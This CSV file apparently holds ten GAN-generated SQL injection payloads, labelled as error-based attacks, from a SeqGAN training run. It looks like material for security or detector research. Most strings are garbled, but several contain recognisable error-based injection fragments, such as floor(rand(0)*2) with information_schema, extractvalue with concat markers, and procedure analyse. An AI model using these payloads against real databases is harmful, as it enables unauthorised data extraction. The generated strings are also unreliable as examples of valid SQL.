label,payload,family,payload_type,method,run_id,sample_index
attack,"1%4838%'  =  '   :8382'  =  '*%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,0
attack,"-CmU>  ||chr  (  >  =  ||coass   (    ,floor  (  select where  1 group AIS.SINMe where whenas from E  (  *2  case   )   from or 3931IT DI||Shruhro  *.5305     having groupelse m 1 from 1 else information_schema"" like ""Gsuit  case   SELECTunadrntsx.r  ( 8382  case whena by 9891  ||chr  end     x   thena 1 0",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,1
attack,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  "" select whereror.NUe_r.chr  (  )  ||s 1 union 6825 0 unionfrom (  =  a union or 0 from 3074  x,  )  ui,concat  1297  select 1 1  )   )    )   x tre mselect D end  3440   x WHEREE select  ,  )  (  )    9891 from where chr  3074  )   (  )  )    )   )    havingE or  or 4386RthenIs INST 'i'  =2  ||   ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,2
attack,"'harT  (  )  '   )    )   (  ,floor  a  a by  from and ||chr  (  select 1   WHERE 1 do.sT  (  )  =  case 5023_  113  0  4232  *2   (  thenR   select when  (  3440  ||chr  (  (  =  select  DRALIunionSNLMEIShi(  ||chr  (  ||chr  (  (  ||chr  (  *,0x717a767a71~  )     )  ,  mi   x   :.G",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,3
attack,"-j  =  *,floor  v2   )     andc concat  select  )  )  h5856  x.,hr  (  =  =  )   thenE7469  -- 0 fromu  (  ,  *2   ,'(  122  )   FROM from group from xun",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,4
attack,1'   --2   select else INONgecut_ss  1  G 1union DIui,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,5
attack,"1'||  (  select '5967x or union 6082r  (  ||chr  3326  ,3326)  (  c  (  case when   (  *22   )    )   )     )     WHERE >  (  =  )    unam       and  ||r.achhhr  =  uteun   )    tx.rG(  )and oror D by from from     (  *2   )uax DI.SCLCESSCT DIIThr  (  ,0x717a767a71,floor  (  0x717a767a71hr  =   or,  selectx  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,6
attack,"1%L7864)    )   thenIT  (  case when  122  ||chr  select 2131  =  ' 0 E1ia   AND mselect t elseuam   FROM  )  select DSend  0n 0 FROM  (  ||chr  (  rand  =  (  =  a,1210  0    concathr  ur  rand  =  0x7171706a71   (  )       )   )    having FROM     select 1 else whena else 1 7158  =  a   (  (  ||Thr  (  having,  rand  ||chr  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,7
attack,"1-' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'     3326  4232  select DNINT p  (  )   -- where by end  0x7171706a71)   x   then )    concat  106  select 9173 AINAUSALS.1210IST  or 1 106  ,0x717a767a71,concat  =  ||chr  (  (    =  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,8
attack,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'ytz7881unau'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,9
